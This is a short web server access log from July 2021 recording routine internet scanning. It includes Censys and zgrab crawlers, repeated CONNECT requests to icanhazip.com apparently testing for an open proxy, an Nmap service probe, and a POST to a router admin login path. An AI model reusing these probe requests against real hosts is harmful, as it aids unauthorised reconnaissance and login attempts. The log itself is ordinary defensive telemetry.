173.208.236.114 - - [29/Jul/2021:03:23:23 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [29/Jul/2021:04:23:28 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
45.3.31.102 - - [29/Jul/2021:04:25:07 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
167.248.133.40 - - [29/Jul/2021:04:40:45 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
167.248.133.40 - - [29/Jul/2021:04:40:45 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
23.251.102.74 - - [29/Jul/2021:05:16:32 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
173.208.236.114 - - [29/Jul/2021:05:23:08 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
202.136.88.68 - - [29/Jul/2021:05:59:25 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
162.142.125.55 - - [29/Jul/2021:06:09:41 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
162.142.125.55 - - [29/Jul/2021:06:09:42 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.141.32.217 - - [29/Jul/2021:06:16:49 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 405 178 "http://54.193.239.191:8080/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
173.208.236.114 - - [29/Jul/2021:06:28:28 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [29/Jul/2021:07:28:31 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [29/Jul/2021:08:28:44 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [29/Jul/2021:09:24:47 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
173.208.236.114 - - [29/Jul/2021:10:24:45 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
46.174.191.29 - - [29/Jul/2021:10:49:25 +0000] "GET / HTTP/1.0" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30"
88.9.119.217 - - [29/Jul/2021:10:54:22 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 zgrab/0.x"
162.142.125.53 - - [29/Jul/2021:10:56:46 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
162.142.125.53 - - [29/Jul/2021:10:56:47 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
173.208.236.114 - - [29/Jul/2021:11:24:44 +0000] "CONNECT icanhazip.com:443 HTTP/1.1" 405 178 "-" "Go-http-client/1.1"
64.62.197.32 - - [29/Jul/2021:11:25:14 +0000] "GET / HTTP/1.1" 200 0 "-" "-"
162.62.117.51 - - [29/Jul/2021:12:16:12 +0000] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0" 404 232 "-" "-"
37.255.240.181 - - [29/Jul/2021:12:28:28 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
